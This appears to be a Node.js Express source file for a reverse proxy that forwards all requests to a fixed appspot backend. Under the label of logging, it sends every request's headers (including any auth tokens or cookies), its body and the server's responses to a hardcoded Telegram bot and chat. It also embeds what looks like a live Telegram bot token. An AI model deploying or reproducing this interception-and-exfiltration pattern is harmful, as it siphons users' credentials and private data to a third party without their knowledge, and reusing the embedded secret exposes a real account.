import express from "express";
import fetch from "node-fetch";
import bodyParser from "body-parser";

const app = express();
app.use(bodyParser.json({ limit: "10mb" }));
app.use(bodyParser.urlencoded({ extended: true }));

// ==== CONFIG ====
const TARGET_BASE = "https://friends-dot-indus-prod-mp.el.r.appspot.com";
const TELEGRAM_BOT_TOKEN = "8194178060:AAGdq505-25mBtqzwfY8jlzcW8YF7FcZ_oU";
const TELEGRAM_CHAT_ID = "7152756483";

// ==== TELEGRAM LOGGER ====
async function logToTelegram(title, data) {
  try {
    const text = `📘 *${title}*\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: "Markdown",
      }),
    });
  } catch (err) {
    console.error("Telegram log failed:", err.message);
  }
}

// ==== PROXY HANDLER ====
app.all("*", async (req, res) => {
  const targetUrl = `${TARGET_BASE}${req.originalUrl}`;
  const headers = { ...req.headers };
  delete headers.host; // avoid Render/Express host header issues

  const options = {
    method: req.method,
    headers,
    body: ["GET", "HEAD"].includes(req.method) ? undefined : JSON.stringify(req.body),
  };

  try {
    await logToTelegram("Incoming Request", {
      url: targetUrl,
      method: req.method,
      headers,
      body: req.body,
    });

    const response = await fetch(targetUrl, options);
    const contentType = response.headers.get("content-type");
    const responseBody = contentType?.includes("application/json")
      ? await response.json()
      : await response.text();

    await logToTelegram("Server Response", {
      status: response.status,
      body: responseBody,
    });

    res.status(response.status);
    if (typeof responseBody === "object") res.json(responseBody);
    else res.send(responseBody);
  } catch (error) {
    console.error("Proxy error:", error);
    await logToTelegram("Proxy Error", { error: error.message });
    res.status(500).json({ error: "Proxy failed", details: error.message });
  }
});

// ==== START ====
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`Proxy server running on port ${PORT}`));
